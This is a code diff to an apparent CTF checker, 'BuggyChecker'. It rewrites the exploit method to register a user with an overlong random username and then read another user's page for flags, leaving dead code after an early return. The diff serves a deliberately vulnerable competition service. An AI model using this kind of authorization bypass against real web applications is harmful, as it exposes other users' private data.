@@ -10,6 +10,7 @@ import re
 from bs4 import BeautifulSoup as BS
 from datetime import datetime, timedelta
 from hashlib import sha256
+from time import sleep
 
 
 def random_string(amount):
@@ -112,7 +113,29 @@ class BuggyChecker(BaseChecker):
             raise BrokenServiceException("checker failed")
 
     def exploit(self) -> None:
-        FLAG_RE = r"🏳️‍🌈\\X{4}"
+        password = random_string(20)
+        u = random_string(65)
+        password = "test123"
+
+        response = self.http_post(route="/register", data={"username":u, "pw":password},
+                allow_redirects=True)
+        r = self.http_get(route=f"/user/itdoesntmatter", cookies=response.cookies)
+        print(r.text)  # Flags in here
+
+        return
+        # Old stuff down here
+
+        # response = self.http_post(route="/register", data={"username":u, "pw":password},
+        #         allow_redirects=False)
+        # r = self.http_get(route=f"/logout")
+        comment = "Awesome!"
+        # Post Comment
+        buggy = random.choice(["super", "mega"])
+        response = self.http_post(route=f"/{buggy}-buggy", data={"comment":comment},
+                cookies=r.cookies, allow_redirects=False)
+
+
+        # FLAG_RE = r"🏳️‍🌈\\X{4}"
         u = []
         for b in ["mega", "super"]:
             r = self.http_get(route=f"/{b}-buggy")
